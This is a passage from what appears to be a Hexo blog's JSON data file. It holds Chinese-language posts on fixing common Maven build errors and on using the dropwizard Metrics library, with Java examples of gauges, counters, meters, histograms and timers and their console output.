class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nested exception is com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException: Invalid byte 2 of 3-byte UTF-8 sequence</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x539F;&#x56E0;&#xFF1A;</strong>xml&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x7684;&#x7F16;&#x7801;&#x4E0E;xml&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x4FDD;&#x5B58;&#x65F6;&#x7684;&#x7F16;&#x7801;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x6BD4;&#x5982;&#x4F60;&#x7684;&#x58F0;&#x660E;&#x662F;UTF-8&#xFF0C;&#x4F46;&#x662F;&#x5374;&#x4EE5;ANSI&#x683C;&#x5F0F;&#x7F16;&#x7801;&#x4FDD;&#x5B58;&#x3002;&#x5C3D;&#x7BA1;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF0C;&#x4F46;xml&#x89E3;&#x6790;&#x5668;&#x4ECD;&#x65E0;&#x6CD5;&#x89E3;&#x6790;&#x3002;&#x6709;&#x4E9B;&#x4EBA;&#x5EFA;&#x8BAE;&#x628A;xml&#x6539;&#x4E3A;GBK&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x53EF;&#x53D6;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x4E3A;&#xFF1A;&#x7528;&#x8BB0;&#x4E8B;&#x672C;&#x6253;&#x5F00;xml&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x65B0;save&#x3002;</p>\n<hr>\n<p><strong>&#x95EE;&#x9898;4&#xFF1A;&#x5C06;svn&#x7684;maven&#x9879;&#x76EE;checkout&#x81F3;Eclipse&#xFF0C;&#x6709;&#x65F6;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java.lang.NoClassDefFoundError: Lorg/apache/<span class=\"built_in\">log</span>4j/Logger&#x9519;&#x8BEF;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x539F;&#x56E0;&#xFF1A;</strong>maven install&#x751F;&#x6210;&#x7684;jar&#x5305;&#x6CA1;&#x6709;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#xFF0C;&#x6309;&#x4E0B;&#x56FE;&#x914D;&#x7F6E;&#x5373;&#x53EF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Maven%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1.jpg\" alt=\"&#x56FE;&#x7247;1\"></p>\n","excerpt":"<p><em>&#x6700;&#x8FD1;&#x4F7F;&#x7528;maven&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x9047;&#x5230;&#x4E00;&#x4E9B;&#x95EE;&#x9898;&#xFF0C;&#x8BB0;&#x5F55;&#x5982;&#x4E0B;&#xFF0C;&#x65B9;&#x4FBF;&#x65E5;&#x540E;&#x67E5;&#x8BE2;&#x6240;&#x7528;</em></p>\n<p><strong>&#x95EE;&#x9898;1&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;,&#x63D0;&#x793A;source-1.5&#x4E0D;&#x652F;&#x6301;diamond&#x8FD0;&#x7B97;&#x7B26;&#xFF0C;&#x5EFA;&#x8BAE;&#x6362;&#x6210;1.7</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x7F16;&#x8BD1;&#x7248;&#x672C;&#x51FA;&#x4E86;&#x95EE;&#x9898;&#xFF0C;&#x5728;pom.xml&#x76F8;&#x5E94;&#x4F4D;&#x7F6E;&#x6DFB;&#x52A0;1.7&#x6216;1.7&#x4EE5;&#x4E0A;&#x7684;source&#x548C;target&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;plugins&gt; </span><br><span class=\"line\">  &lt;plugin&gt; </span><br><span class=\"line\">    &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt; </span><br><span class=\"line\">\t&lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt; </span><br><span class=\"line\">\t&lt;configuration&gt; </span><br><span class=\"line\">\t  &lt;<span class=\"built_in\">source</span>&gt;1.7&lt;/<span class=\"built_in\">source</span>&gt; </span><br><span class=\"line\">\t  &lt;target&gt;1.7&lt;/target&gt; </span><br><span class=\"line\">\t&lt;/configuration&gt; </span><br><span class=\"line\">  &lt;/plugin&gt; </span><br><span class=\"line\">&lt;/plugins&gt;</span><br></pre></td></tr></table></figure></p>\n<hr>\n<p><strong>&#x95EE;&#x9898;2&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x63D0;&#x793A;&#x7F16;&#x7801;GBK&#x7684;&#x4E0D;&#x53EF;&#x6620;&#x5C04;&#x5B57;&#x7B26;</strong><br><strong>&#x539F;&#x56E0;&#xFF1A;</strong>&#x5B57;&#x7B26;&#x7F16;&#x7801;&#x9519;&#x8BEF;&#xFF0C;&#x5728;&#x95EE;&#x9898;1&#x7684;target&#x4EE3;&#x7801;&#x4E0B;&#x589E;&#x52A0;&#x4E0B;&#x9762;&#x4E00;&#x884C;&#x5373;&#x53EF;<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;encoding&gt;utf8&lt;/encoding&gt;</span><br></pre></td></tr></table></figure></p>","more":"<hr>\n<p><strong>&#x95EE;&#x9898;3&#xFF1A;&#x6267;&#x884C;package&#x547D;&#x4EE4;&#x62A5;&#x9519;&#xFF0C;&#x67D0;&#x4E2A;xml&#x6587;&#x4EF6;&#x63D0;&#x793A;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nested exception is com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException: Invalid byte 2 of 3-byte UTF-8 sequence</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x539F;&#x56E0;&#xFF1A;</strong>xml&#x6587;&#x4EF6;&#x4E2D;&#x58F0;&#x660E;&#x7684;&#x7F16;&#x7801;&#x4E0E;xml&#x6587;&#x4EF6;&#x672C;&#x8EAB;&#x4FDD;&#x5B58;&#x65F6;&#x7684;&#x7F16;&#x7801;&#x4E0D;&#x4E00;&#x81F4;&#x3002;&#x6BD4;&#x5982;&#x4F60;&#x7684;&#x58F0;&#x660E;&#x662F;UTF-8&#xFF0C;&#x4F46;&#x662F;&#x5374;&#x4EE5;ANSI&#x683C;&#x5F0F;&#x7F16;&#x7801;&#x4FDD;&#x5B58;&#x3002;&#x5C3D;&#x7BA1;&#x6587;&#x4EF6;&#x6CA1;&#x6709;&#x51FA;&#x73B0;&#x4E71;&#x7801;&#xFF0C;&#x4F46;xml&#x89E3;&#x6790;&#x5668;&#x4ECD;&#x65E0;&#x6CD5;&#x89E3;&#x6790;&#x3002;&#x6709;&#x4E9B;&#x4EBA;&#x5EFA;&#x8BAE;&#x628A;xml&#x6539;&#x4E3A;GBK&#xFF0C;&#x8FD9;&#x5E76;&#x4E0D;&#x53EF;&#x53D6;&#x3002;&#x89E3;&#x51B3;&#x65B9;&#x6CD5;&#x4E3A;&#xFF1A;&#x7528;&#x8BB0;&#x4E8B;&#x672C;&#x6253;&#x5F00;xml&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x65B0;save&#x3002;</p>\n<hr>\n<p><strong>&#x95EE;&#x9898;4&#xFF1A;&#x5C06;svn&#x7684;maven&#x9879;&#x76EE;checkout&#x81F3;Eclipse&#xFF0C;&#x6709;&#x65F6;&#x62A5;&#x5982;&#x4E0B;&#x9519;&#x8BEF;</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java.lang.NoClassDefFoundError: Lorg/apache/<span class=\"built_in\">log</span>4j/Logger&#x9519;&#x8BEF;</span><br></pre></td></tr></table></figure></p>\n<p><strong>&#x539F;&#x56E0;&#xFF1A;</strong>maven install&#x751F;&#x6210;&#x7684;jar&#x5305;&#x6CA1;&#x6709;&#x81EA;&#x52A8;&#x5F15;&#x5165;&#xFF0C;&#x6309;&#x4E0B;&#x56FE;&#x914D;&#x7F6E;&#x5373;&#x53EF;</p>\n<p><img src=\"http://7xvfir.com1.z0.glb.clouddn.com/Maven%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB/1.jpg\" alt=\"&#x56FE;&#x7247;1\"></p>"},{"title":"Metrics","date":"2016-09-12T14:10:00.000Z","_content":"\n系统开发到一定的阶段，线上的机器越来越多，就需要一些监控了，除了服务器的监控，业务方面也需要一些监控服务。Metrics作为一款监控指标的度量类库，提供了许多工具帮助开发者来完成自定义的监控工作。\n\n举个例子，一个图片压缩服务：\n\n- 每秒钟的请求数是多少（TPS）？\n- 平均每个请求处理的时间？\n- 请求处理的最长耗时？\n- 等待处理的请求队列长度？\n\n又或者一个缓存服务：\n\n- 缓存的命中率？\n- 平均查询缓存的时间？\n\n基本上每一个服务、应用都需要做一个监控系统，这需要尽量以少量的代码，实现统计某类数据的功能。\n\n以Java为例，目前最为流行的metrics库是来自Coda Hale 的 dropwizard/metrics，该库被广泛地应用于各个知名的开源项目中。例如 Hadoop，Kafka，Spark，JStorm 中。\n\n本文就结合范例来主要介绍下 dropwizard/metrics 的概念和用法。\n\n---\n\n### Maven 配置\n我们需要在pom.xml中依赖 metrics-core 包：\n```bash\n<dependencies>\n    <dependency>\n        <groupId>io.dropwizard.metrics</groupId>\n        <artifactId>metrics-core</artifactId>\n        <version>${metrics.version}</version>\n    </dependency>\n</dependencies>\n```\n***注：在POM文件中需要声明 ${metrics.version} 的具体版本号，如 3.1.0***\n\n---\n\n### Metric Registries\nMetricRegistry类是Metrics的核心，它是存放应用中所有metrics的容器。也是我们使用 Metrics 库的起点。\n\n```bash\nMetricRegistry registry = new MetricRegistry();\n```\n\n每一个 metric 都有它独一无二的名字，Metrics 中使用句点名字，如 com.example.Queue.size。当你在 com.example.Queue 下有两个 metric 实例，可以指定地更具体：com.example.Queue.requests.size 和 com.example.Queue.response.size 。使用MetricRegistry类，可以非常方便地生成名字。\n\n```bash\nMetricRegistry.name(Queue.class, \"requests\", \"size\")\nMetricRegistry.name(Queue.class, \"responses\", \"size\")\n```\n\n---\n\n### Metrics 数据展示\nMetircs 提供了 Report 接口，用于展示 metrics 获取到的统计数据。metrics-core中主要实现了四种 reporter： JMX, console, SLF4J, 和 CSV。 在本文的例子中，我们使用 ConsoleReporter 。\n\n---\n\n### 五种 Metrics 类型\n\n#### Gauges\n\n最简单的度量指标，只有一个简单的返回值，例如，我们想衡量一个待处理队列中任务的个数，代码如下：\n```bash\npublic class GaugeTest {\n\n    public static Queue<String> q = new LinkedList<String>();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        registry.register(MetricRegistry.name(GaugeTest.class, \"queue\", \"size\"), \n        new Gauge<Integer>() {\n\n            public Integer getValue() {\n                return q.size();\n            }\n        });\n\n        while(true){\n            Thread.sleep(1000);\n            q.add(\"Job-xxx\");\n        }\n    }\n}\n```\n\n运行之后的结果如下：\n```bash\n-- Gauges ------------------------------------------------\ncom.alibaba.wuchong.metrics.GaugeTest.queue.size\n             value = 6\n```\n\n其中第7行和第8行添加了ConsoleReporter，可以每秒钟将度量指标打印在屏幕上，理解起来会更清楚。\n\n但是对于大多数队列数据结构，我们并不想简单地返回queue.size()，因为java.util和java.util.concurrent中实现的#size()方法很多都是 O(n) 的复杂度，这会影响 Gauge 的性能。\n\n#### Counters\n\nCounter 就是计数器，Counter 只是用 Gauge 封装了 AtomicLong 。我们可以使用如下的方法，使得获得队列大小更加高效。\n\n```bash\npublic class CounterTest {\n\n    public static Queue<String> q = new LinkedBlockingQueue<String>();\n\n    public static Counter pendingJobs;\n\n    public static Random random = new Random();\n\n    public static void addJob(String job) {\n        pendingJobs.inc();\n        q.offer(job);\n    }\n\n    public static String takeJob() {\n        pendingJobs.dec();\n        return q.poll();\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        pendingJobs = registry.counter(MetricRegistry.name(Queue.class,\"pending-jobs\",\"size\"));\n\n        int num = 1;\n        while(true){\n            Thread.sleep(200);\n            if (random.nextDouble() > 0.7){\n                String job = takeJob();\n                System.out.println(\"take job : \"+job);\n            }else{\n                String job = \"Job-\"+num;\n                addJob(job);\n                System.out.println(\"add job : \"+job);\n            }\n            num++;\n        }\n    }\n}\n```\n\n运行之后的结果大致如下：\n\n```bash\nadd job : Job-15\nadd job : Job-16\ntake job : Job-8\ntake job : Job-10\nadd job : Job-19\n15-8-1 16:11:31 ============================================\n-- Counters ----------------------------------------------\njava.util.Queue.pending-jobs.size\n             count = 5\n```\n\n#### Meters\n\nMeter度量一系列事件发生的速率(rate)，例如TPS。Meters会统计最近1分钟，5分钟，15分钟，还有全部时间的速率。\n```bash\npublic class MeterTest {\n\n    public static Random random = new Random();\n\n    public static void request(Meter meter){\n        System.out.println(\"request\");\n        meter.mark();\n    }\n\n    public static void request(Meter meter, int n){\n        while(n > 0){\n            request(meter);\n            n--;\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,\"request\",\"tps\"));\n\n        while(true){\n            request(meterTps,random.nextInt(5));\n            Thread.sleep(1000);\n        }\n\n    }\n}\n```\n\n运行结果大致如下：\n\n```bash\nrequest\n15-8-1 16:23:25 ============================================\n\n-- Meters ------------------------------------------------\ncom.alibaba.wuchong.metrics.MeterTest.request.tps\n             count = 134\n         mean rate = 2.13 events/second\n     1-minute rate = 2.52 events/second\n     5-minute rate = 3.16 events/second\n    15-minute rate = 3.32 events/second\n```\n***注：非常像 Unix 系统中 uptime 和 top 中的 load。***\n\n#### Histograms\n\nHistogram统计数据的分布情况。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, 和 99.9百分位的值(percentiles)。\n\n比如request的大小的分布：\n```bash\npublic class HistogramTest {\n    public static Random random = new Random();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir());\n        registry.register(MetricRegistry.name(HistogramTest.class, \"request\", \"histogram\"), histogram);\n        \n        while(true){\n            Thread.sleep(1000);\n            histogram.update(random.nextInt(100000));\n        }\n\n    }\n}\n```\n\n运行之后结果大致如下：\n\n```bash\n-- Histograms --------------------------------------------\njava.util.Queue.queue.histogram\n             count = 56\n               min = 1122\n               max = 99650\n              mean = 48735.12\n            stddev = 28609.02\n            median = 49493.00\n              75% <= 72323.00\n              95% <= 90773.00\n              98% <= 94011.00\n              99% <= 99650.00\n            99.9% <= 99650.00\n```\n\n#### Timers\n\nTimer其实是 Histogram 和 Meter 的结合， histogram 某部分代码/调用的耗时， meter统计TPS。\n\n```bash\npublic class TimerTest {\n\n    public static Random random = new Random();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,\"get-latency\"));\n\n        Timer.Context ctx;\n\n        while(true){\n            ctx = timer.time();\n            Thread.sleep(random.nextInt(1000));\n            ctx.stop();\n        }\n\n    }\n}\n```\n\n运行之后结果如下：\n\n```bash\n-- Timers ------------------------------------------------\ncom.alibaba.wuchong.metrics.TimerTest.get-latency\n             count = 38\n         mean rate = 1.90 calls/second\n     1-minute rate = 1.66 calls/second\n     5-minute rate = 1.61 calls/second\n    15-minute rate = 1.60 calls/second\n               min = 13.90 milliseconds\n               max = 988.71 milliseconds\n              mean = 519.21 milliseconds\n            stddev = 286.23 milliseconds\n            median = 553.84 milliseconds\n              75% <= 763.64 milliseconds\n              95% <= 943.27 milliseconds\n              98% <= 988.71 milliseconds\n              99% <= 988.71 milliseconds\n            99.9% <= 988.71 milliseconds\n```\n\n---\n\n### 其他\n初次之外，Metrics还提供了[HealthCheck](http://metrics.dropwizard.io/3.1.0/manual/healthchecks/) 用来检测某个某个系统是否健康，例如数据库连接是否正常。还有[Metrics Annotation](https://dropwizard.github.io/metrics/3.1.0/apidocs/com/codahale/metrics/annotation/package-tree.html)，可以很方便地实现统计某个方法，某个值的数据。感兴趣的可以点进链接看看。\n\n---\n\n### 使用经验总结\n一般情况下，当我们需要统计某个函数被调用的频率（TPS），会使用Meters。当我们需要统计某个函数的执行耗时时，会使用Histograms。当我们既要统计TPS又要统计耗时时，我们会使用Timers。\n\n---\n\n### 参考资料\n[Metrics Core](http://metrics.dropwizard.io/3.1.0/manual/core/)\n[Metrics Getting Started](Metrics Getting Started)","source":"_posts/Metrics.md","raw":"---\ntitle: Metrics\ncategories:\n  - 运维部署\ntags:\n  - Metrics\ndate: 2016-9-12 22:10:00\n\n---\n\n系统开发到一定的阶段，线上的机器越来越多，就需要一些监控了，除了服务器的监控，业务方面也需要一些监控服务。Metrics作为一款监控指标的度量类库，提供了许多工具帮助开发者来完成自定义的监控工作。\n\n举个例子，一个图片压缩服务：\n\n- 每秒钟的请求数是多少（TPS）？\n- 平均每个请求处理的时间？\n- 请求处理的最长耗时？\n- 等待处理的请求队列长度？\n\n又或者一个缓存服务：\n\n- 缓存的命中率？\n- 平均查询缓存的时间？\n\n基本上每一个服务、应用都需要做一个监控系统，这需要尽量以少量的代码，实现统计某类数据的功能。\n\n以Java为例，目前最为流行的metrics库是来自Coda Hale 的 dropwizard/metrics，该库被广泛地应用于各个知名的开源项目中。例如 Hadoop，Kafka，Spark，JStorm 中。\n\n本文就结合范例来主要介绍下 dropwizard/metrics 的概念和用法。\n\n---\n\n### Maven 配置\n我们需要在pom.xml中依赖 metrics-core 包：\n```bash\n<dependencies>\n    <dependency>\n        <groupId>io.dropwizard.metrics</groupId>\n        <artifactId>metrics-core</artifactId>\n        <version>${metrics.version}</version>\n    </dependency>\n</dependencies>\n```\n***注：在POM文件中需要声明 ${metrics.version} 的具体版本号，如 3.1.0***\n\n---\n\n### Metric Registries\nMetricRegistry类是Metrics的核心，它是存放应用中所有metrics的容器。也是我们使用 Metrics 库的起点。\n\n```bash\nMetricRegistry registry = new MetricRegistry();\n```\n\n每一个 metric 都有它独一无二的名字，Metrics 中使用句点名字，如 com.example.Queue.size。当你在 com.example.Queue 下有两个 metric 实例，可以指定地更具体：com.example.Queue.requests.size 和 com.example.Queue.response.size 。使用MetricRegistry类，可以非常方便地生成名字。\n\n```bash\nMetricRegistry.name(Queue.class, \"requests\", \"size\")\nMetricRegistry.name(Queue.class, \"responses\", \"size\")\n```\n\n---\n\n### Metrics 数据展示\nMetircs 提供了 Report 接口，用于展示 metrics 获取到的统计数据。metrics-core中主要实现了四种 reporter： JMX, console, SLF4J, 和 CSV。 在本文的例子中，我们使用 ConsoleReporter 。\n\n---\n\n### 五种 Metrics 类型\n\n#### Gauges\n\n最简单的度量指标，只有一个简单的返回值，例如，我们想衡量一个待处理队列中任务的个数，代码如下：\n```bash\npublic class GaugeTest {\n\n    public static Queue<String> q = new LinkedList<String>();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        registry.register(MetricRegistry.name(GaugeTest.class, \"queue\", \"size\"), \n        new Gauge<Integer>() {\n\n            public Integer getValue() {\n                return q.size();\n            }\n        });\n\n        while(true){\n            Thread.sleep(1000);\n            q.add(\"Job-xxx\");\n        }\n    }\n}\n```\n\n运行之后的结果如下：\n```bash\n-- Gauges ------------------------------------------------\ncom.alibaba.wuchong.metrics.GaugeTest.queue.size\n             value = 6\n```\n\n其中第7行和第8行添加了ConsoleReporter，可以每秒钟将度量指标打印在屏幕上，理解起来会更清楚。\n\n但是对于大多数队列数据结构，我们并不想简单地返回queue.size()，因为java.util和java.util.concurrent中实现的#size()方法很多都是 O(n) 的复杂度，这会影响 Gauge 的性能。\n\n#### Counters\n\nCounter 就是计数器，Counter 只是用 Gauge 封装了 AtomicLong 。我们可以使用如下的方法，使得获得队列大小更加高效。\n\n```bash\npublic class CounterTest {\n\n    public static Queue<String> q = new LinkedBlockingQueue<String>();\n\n    public static Counter pendingJobs;\n\n    public static Random random = new Random();\n\n    public static void addJob(String job) {\n        pendingJobs.inc();\n        q.offer(job);\n    }\n\n    public static String takeJob() {\n        pendingJobs.dec();\n        return q.poll();\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        pendingJobs = registry.counter(MetricRegistry.name(Queue.class,\"pending-jobs\",\"size\"));\n\n        int num = 1;\n        while(true){\n            Thread.sleep(200);\n            if (random.nextDouble() > 0.7){\n                String job = takeJob();\n                System.out.println(\"take job : \"+job);\n            }else{\n                String job = \"Job-\"+num;\n                addJob(job);\n                System.out.println(\"add job : \"+job);\n            }\n            num++;\n        }\n    }\n}\n```\n\n运行之后的结果大致如下：\n\n```bash\nadd job : Job-15\nadd job : Job-16\ntake job : Job-8\ntake job : Job-10\nadd job : Job-19\n15-8-1 16:11:31 ============================================\n-- Counters ----------------------------------------------\njava.util.Queue.pending-jobs.size\n             count = 5\n```\n\n#### Meters\n\nMeter度量一系列事件发生的速率(rate)，例如TPS。Meters会统计最近1分钟，5分钟，15分钟，还有全部时间的速率。\n```bash\npublic class MeterTest {\n\n    public static Random random = new Random();\n\n    public static void request(Meter meter){\n        System.out.println(\"request\");\n        meter.mark();\n    }\n\n    public static void request(Meter meter, int n){\n        while(n > 0){\n            request(meter);\n            n--;\n        }\n    }\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Meter meterTps = registry.meter(MetricRegistry.name(MeterTest.class,\"request\",\"tps\"));\n\n        while(true){\n            request(meterTps,random.nextInt(5));\n            Thread.sleep(1000);\n        }\n\n    }\n}\n```\n\n运行结果大致如下：\n\n```bash\nrequest\n15-8-1 16:23:25 ============================================\n\n-- Meters ------------------------------------------------\ncom.alibaba.wuchong.metrics.MeterTest.request.tps\n             count = 134\n         mean rate = 2.13 events/second\n     1-minute rate = 2.52 events/second\n     5-minute rate = 3.16 events/second\n    15-minute rate = 3.32 events/second\n```\n***注：非常像 Unix 系统中 uptime 和 top 中的 load。***\n\n#### Histograms\n\nHistogram统计数据的分布情况。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, 和 99.9百分位的值(percentiles)。\n\n比如request的大小的分布：\n```bash\npublic class HistogramTest {\n    public static Random random = new Random();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Histogram histogram = new Histogram(new ExponentiallyDecayingReservoir());\n        registry.register(MetricRegistry.name(HistogramTest.class, \"request\", \"histogram\"), histogram);\n        \n        while(true){\n            Thread.sleep(1000);\n            histogram.update(random.nextInt(100000));\n        }\n\n    }\n}\n```\n\n运行之后结果大致如下：\n\n```bash\n-- Histograms --------------------------------------------\njava.util.Queue.queue.histogram\n             count = 56\n               min = 1122\n               max = 99650\n              mean = 48735.12\n            stddev = 28609.02\n            median = 49493.00\n              75% <= 72323.00\n              95% <= 90773.00\n              98% <= 94011.00\n              99% <= 99650.00\n            99.9% <= 99650.00\n```\n\n#### Timers\n\nTimer其实是 Histogram 和 Meter 的结合， histogram 某部分代码/调用的耗时， meter统计TPS。\n\n```bash\npublic class TimerTest {\n\n    public static Random random = new Random();\n\n    public static void main(String[] args) throws InterruptedException {\n        MetricRegistry registry = new MetricRegistry();\n        ConsoleReporter reporter = ConsoleReporter.forRegistry(registry).build();\n        reporter.start(1, TimeUnit.SECONDS);\n\n        Timer timer = registry.timer(MetricRegistry.name(TimerTest.class,\"get-latency\"));\n\n        Timer.Context ctx;\n\n        while(true){\n            ctx = timer.time();\n            Thread.sleep(random.nextInt(1000));\n            ctx.stop();\n        }\n\n    }\n}\n```\n\n运行之后结果如下：\n\n```bash\n-- Timers ------------------------------------------------\ncom.alibaba.wuchong.metrics.TimerTest.get-latency\n             count = 38\n         mean rate = 1.90 calls/second\n     1-minute rate = 1.66 calls/second\n     5-minute rate = 1.61 calls/second\n    15-minute rate = 1.60 calls/second\n               min = 13.90 milliseconds\n               max = 988.71 milliseconds\n              mean = 519.21 milliseconds\n            stddev = 286.23 milliseconds\n            median = 553.84 milliseconds\n              75% <= 763.64 milliseconds\n              95% <= 943.27 milliseconds\n              98% <= 988.71 milliseconds\n              99% <= 988.71 milliseconds\n            99.9% <= 988.71 milliseconds\n```\n\n---\n\n### 其他\n初次之外，Metrics还提供了[HealthCheck](http://metrics.dropwizard.io/3.1.0/manual/healthchecks/) 用来检测某个某个系统是否健康，例如数据库连接是否正常。还有[Metrics Annotation](https://dropwizard.github.io/metrics/3.1.0/apidocs/com/codahale/metrics/annotation/package-tree.html)，可以很方便地实现统计某个方法，某个值的数据。感兴趣的可以点进链接看看。\n\n---\n\n### 使用经验总结\n一般情况下，当我们需要统计某个函数被调用的频率（TPS），会使用Meters。当我们需要统计某个函数的执行耗时时，会使用Histograms。当我们既要统计TPS又要统计耗时时，我们会使用Timers。\n\n---\n\n### 参考资料\n[Metrics Core](http://metrics.dropwizard.io/3.1.0/manual/core/)\n[Metrics Getting Started](Metrics Getting Started)","slug":"Metrics","published":1,"updated":"2016-11-18T11:47:46.078Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulbd0019gwtmmo59zi59","content":"<p>&#x7CFB;&#x7EDF;&#x5F00;&#x53D1;&#x5230;&#x4E00;&#x5B9A;&#x7684;&#x9636;&#x6BB5;&#xFF0C;&#x7EBF;&#x4E0A;&#x7684;&#x673A;&#x5668;&#x8D8A;&#x6765;&#x8D8A;&#x591A;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x4E86;&#xFF0C;&#x9664;&#x4E86;&#x670D;&#x52A1;&#x5668;&#x7684;&#x76D1;&#x63A7;&#xFF0C;&#x4E1A;&#x52A1;&#x65B9;&#x9762;&#x4E5F;&#x9700;&#x8981;&#x4E00;&#x4E9B;&#x76D1;&#x63A7;&#x670D;&#x52A1;&#x3002;Metrics&#x4F5C;&#x4E3A;&#x4E00;&#x6B3E;&#x76D1;&#x63A7;&#x6307;&#x6807;&#x7684;&#x5EA6;&#x91CF;&#x7C7B;&#x5E93;&#xFF0C;&#x63D0;&#x4F9B;&#x4E86;&#x8BB8;&#x591A;&#x5DE5;&#x5177;&#x5E2E;&#x52A9;&#x5F00;&#x53D1;&#x8005;&#x6765;&#x5B8C;&#x6210;&#x81EA;&#x5B9A;&#x4E49;&#x7684;&#x76D1;&#x63A7;&#x5DE5;&#x4F5C;&#x3002;</p>\n<p>&#x4E3E;&#x4E2A;&#x4F8B;&#x5B50;&#xFF0C;&#x4E00;&#x4E2A;&#x56FE;&#x7247;&#x538B;&#x7F29;&#x670D;&#x52A1;&#xFF1A;</p>\n<ul>\n<li>&#x6BCF;&#x79D2;&#x949F;&#x7684;&#x8BF7;&#x6C42;&#x6570;&#x662F;&#x591A;&#x5C11;&#xFF08;TPS&#xFF09;&#xFF1F;</li>\n<li>&#x5E73;&#x5747;&#x6BCF;&#x4E2A;&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x65F6;&#x95F4;&#xFF1F;</li>\n<li>&#x8BF7;&#x6C42;&#x5904;&#x7406;&#x7684;&#x6700;&#x957F;&#x8017;&#x65F6;&#xFF1F;</li>\n<li>&#x7B49;&#x5F85;&#x5904;&#x7406;&#x7684;&#x8BF7;&#x6C42;&#x961F;&#x5217;&#x957F;&#x5EA6;&#xFF1F;</li>\n</ul>\n<p>&#x53C8;&#x6216;&#x8005;&#x4E00;&#x4E2A;&#x7F13;&#x5B58;&#x670D;&#x52A1;&#xFF1A;</p>\n<ul